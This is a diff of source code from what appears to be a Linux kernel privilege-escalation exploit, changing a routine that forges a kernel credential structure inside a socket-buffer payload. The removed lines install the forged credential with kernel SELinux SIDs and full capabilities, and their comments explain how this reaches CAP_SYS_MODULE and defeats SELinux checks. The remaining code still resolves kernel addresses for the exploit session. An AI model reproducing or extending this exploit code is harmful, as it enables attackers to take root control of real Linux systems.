@@ -177,25 +177,14 @@ void put32(unsigned char *p, size_t off, uint32_t value) {
 
 /* Decoupling plan: encode the profile-specific credential template. Inputs:
  * profile, destination and offset; output: validation/status. Future:
- * payload_build_credential_template(profile, buffer, offset).
- *
- * `as_credential` means the copy is going to be *installed* as task->cred (see
- * credential_install_from_copy()), not merely pointed at as a fake f_op, so
- * every field the kernel dereferences has to be real. */
-static int fill_profile_cred_copy(unsigned char *p, size_t off,
-                                 bool as_credential,
-                                 uintptr_t cred_copy_addr) {
+ * payload_build_credential_template(profile, buffer, offset). */
+static int fill_profile_cred_copy(unsigned char *p, size_t off) {
   const struct kernel_offsets *v = profile_values();
   if (!v || !v->cred_copy_size || v->cred_copy_size > ORDER3_SIZE ||
       v->cred_usage_offset + sizeof(uint32_t) > v->cred_copy_size ||
       v->cred_caps_offset + v->cred_caps_count * sizeof(uint64_t) >
           v->cred_copy_size) {
     pr_error("credential copy profile is incomplete\n");
-    return 0;
-  }
-  if (as_credential && (!cred_copy_addr || v->cred_copy_size > CRED_SEC_BLOB_DELTA)) {
-    pr_error("credential copy cannot host the security blob (size=%u)\n",
-             v->cred_copy_size);
     return 0;
   }
   unsigned char *c = p + off;
@@ -220,60 +209,6 @@ static int fill_profile_cred_copy(unsigned char *p, size_t off,
     }
     put64(c, ref_offsets[i],
           memory::resolved_addresses_data_alias(&g_exploit_session.addresses, ref_images[i]));
-  }
-
-  if (as_credential) {
-    /* The profile's reference table is shifted by one field. Its entries are
-     * {init_cred+0x80, init_user_ns, init_ucounts, init_groups} written to
-     * 0x80/0x88/0x90/0x98, but with `atomic_long_t usage` (8 bytes, which is
-     * why cred_copy_size is 176) those slots are
-     * security/user/user_ns/ucounts.  As-is the copy would hand `security` the
-     * address of init_cred's security *field* (its sid bytes are then half a
-     * pointer, so every SELinux check answers -EINVAL) and hand `user_ns`
-     * init_ucounts (so cap_capable() never matches &init_user_ns and
-     * CAP_SYS_MODULE is unreachable).  Re-place the three standalone globals on
-     * the fields the kernel actually reads, then fix the two fields a static
-     * profile cannot express:
-     *   - security: a mapped blob inside this page with osid = sid =
-     *     SECINITSID_KERNEL.  selinux_* reads tsec->sid even when permissive
-     *     (permissive skips the verdict, not the read), and a stale/absent
-     *     pointer there fails every hooked syscall.
-     *   - cap_bset: caps_count == 3 stops before it, and a zero bounding set
-     *     strips every capability across execve, so PRE_CMD's rmmod child would
-     *     come up capless.  cap_ambient stays zero (it must be a subset). */
-    const uint32_t dst[3] = {
-        CRED_USER_NS_OFF, CRED_UCOUNTS_OFF, CRED_GROUP_INFO_OFF,
-    };
-    const uint64_t src[3] = {
-        v->cred_ref1_image, v->cred_ref2_image, v->cred_ref3_image,
-    };
-    for (size_t i = 0; i < 3; i++) {
-      if (dst[i] + sizeof(uint64_t) > v->cred_copy_size) {
-        pr_error("credential copy field %#x exceeds the copy size\n", dst[i]);
-        return 0;
-      }
-      const uint64_t value =
-          memory::resolved_addresses_data_alias(&g_exploit_session.addresses, src[i]);
-      if (!value) {
-        pr_error("credential copy reference image %zu resolved to zero\n", i + 1);
-        return 0;
-      }
-      put64(c, dst[i], value);
-    }
-    put64(c, CRED_CAP_BSET_OFF, v->cred_caps_value);
-    unsigned char *blob = c + CRED_SEC_BLOB_DELTA;
-    put32(blob, SELINUX_CRED_OSID_OFF, SECINITSID_KERNEL);
-    put32(blob, SELINUX_CRED_SID_OFF, SECINITSID_KERNEL);
-    put64(c, CRED_SECURITY_OFF, cred_copy_addr + CRED_SEC_BLOB_DELTA);
-    uint64_t user_ns = 0, ucounts = 0, group_info = 0;
-    memcpy(&user_ns, c + CRED_USER_NS_OFF, sizeof(user_ns));
-    memcpy(&ucounts, c + CRED_UCOUNTS_OFF, sizeof(ucounts));
-    memcpy(&group_info, c + CRED_GROUP_INFO_OFF, sizeof(group_info));
-    pr_info("cred copy: usage=%u bset=%#llx security=%#zx user_ns=%#zx "
-            "ucounts=%#zx group_info=%#zx\n",
-            v->cred_usage_value, (unsigned long long) v->cred_caps_value,
-            (size_t) (cred_copy_addr + CRED_SEC_BLOB_DELTA),
-            (size_t) user_ns, (size_t) ucounts, (size_t) group_info);
   }
   return 1;
 }
@@ -561,9 +496,7 @@ int prepare_skb_payload(uintptr_t base, const WriteRequest *request) {
     put64(p, LEFT_OFF + 0x10, 0);
 
     if (write_layout.needs_credential_copy &&
-        !fill_profile_cred_copy(p, tcp ? TCP_CRED_COPY_OFF : CRED_COPY_OFF,
-                                credential_install_from_copy(),
-                                write_layout.fops)) {
+        !fill_profile_cred_copy(p, tcp ? TCP_CRED_COPY_OFF : CRED_COPY_OFF)) {
       return 0;
     }
   }
